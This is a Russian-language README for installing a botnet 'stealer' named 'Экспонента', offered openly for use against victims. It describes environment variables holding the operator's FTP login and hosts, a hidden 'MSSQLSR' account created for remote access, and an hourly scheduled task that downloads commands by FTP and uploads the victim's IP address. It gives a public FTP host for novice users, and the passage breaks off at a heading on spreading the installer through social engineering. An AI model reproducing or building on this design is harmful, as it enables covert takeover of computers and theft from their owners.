Инсталлzция стайлера "Экспонента"
=================================

В данном каталоге содердатся дистрибутивы, необходимые для установки стайлера. Все дистрибутивы рабочие, но пока не тестировались.

## Принцип работы программы

После инсталляции файлов стайлера в системном окружении операционной системы появляются следующие переменные:

* _Hacker_User_ – имя (логин) учётной записи компьютера-жертвы на ftp серверах хозяина, с которых будет осуществляться управление ботнетом
* _Hacker_Pass_ – пароль для этой учётной записи. Его нужно указывать, чтобы посторонние не имели доступа к данным жертвы на сервере хозяина. Внимание! Пароль храниться в незащищённом виде! Просто автор не нашёл способа безопасного использования хеша и солей в программах коммуникации.
* _Hacker_host1_ – доменное имя публичного хоста, с которого скачивается установочные файлы и публичные обновления ботнета. Её значение может совпадать со значением следующей переменной, когда используется только один хост.
* _Hacker_host2_ – доменное имя приватного хоста, с которого скачиваются в оффлайн-режиме команды управления ботнетом и на который передаются результаты его работы

Также создаётся учётная запись с именем MSSQLSR для возможного удалённого подключения к компьютеру, а также добавляется задание для терущего пользователя на запуск каждый час файла onsysload, в котором находятся текущие команды управления стайлером.

На приватном хосте создаются аккаунты пользователя-жертвы FTP сервера. В корень этого сервера будут «сваливаться» результаты работы компьютера-жертвы в ботнете, а в папке Private будут расположены командные файлы, загружаемые на компьютер-жертву для управления им.

Рабочая директория стайлера для компьютера-жертвы – c:\pub1\Util

При входе в аккаунт компьютера любого пользователя каждый час запускается на обработку файл onsysload. В нём присутствуют следующие обязательные части:

* ftp загрузка команд для исполнения команд на компьютере-жертве (например, новый файл user_hourly.bat или новый файл отправки данных)
* Определение внешнего IP адреса компьютера в Интернете;
* Переименование и отправка файла с IP адресом на сервер хозяина

Исходные данные
---------------
Для установки стайлера "Экспонента" вам дополнительно потребуется следующее рабочее окружение:

* FTP адрес публичного хостинга файлов стайлера. Он выбирается достаточно произвольно, главное — чтобы он предоставлял анонимный доступ. Хотя программисты могут изменить это условие. Для начинающих пользователей можно использовать публичный FTP адрес стайлера на ftp://88-147-147-107.san.ru/. Доменное имя этого публичного хостинга указывается в переменной Hacker_host1.
* FTP адрес (хостинг, логин и пароль) — для управления компьютером жертвы. Создавать этот адрес необходимо согласно указанным выше принципам работы ботнета, включая иерархию каталогов и круглосуточную доступность сервиса.

Исходя из вышесказанного определитесь, нужно ли Вам редактировать командные файлы этого проекта, или всё оставить с настройками по-умолчанию. Если исправления Вам всё-таки нужны, внесите изменения в клон данного проекта и пересоберите SFX файлы установки дистрибутива.

Создание дистрибутива для распространения методом социальной инженерии
======================================================================

Подготовка установочного файла
------------------------------
